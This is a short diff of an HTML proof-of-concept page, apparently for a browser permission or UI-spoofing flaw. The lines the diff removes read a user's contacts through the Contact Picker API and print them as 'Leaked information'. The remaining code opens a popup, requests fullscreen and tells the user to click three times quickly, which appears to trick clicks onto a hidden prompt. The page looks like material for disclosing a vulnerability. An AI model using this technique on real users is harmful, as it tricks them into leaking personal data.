@@ -22,16 +22,7 @@
 
         <script>
             onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
-                    `);
-                })();
-                
-                open("", "PoC", "_blank");
+                open("https://google.com", "PoC", "_blank");
                  try {
                 if (document.documentElement.requestFullscreen) {
                     await document.documentElement.requestFullscreen();
@@ -71,7 +62,7 @@
 
         <br><br><br>
         <center>
-            <h1>Click dua kali</h1>
+            <h1>Click 3 times quickly</h1>
         </center>
     </body>
 </html>
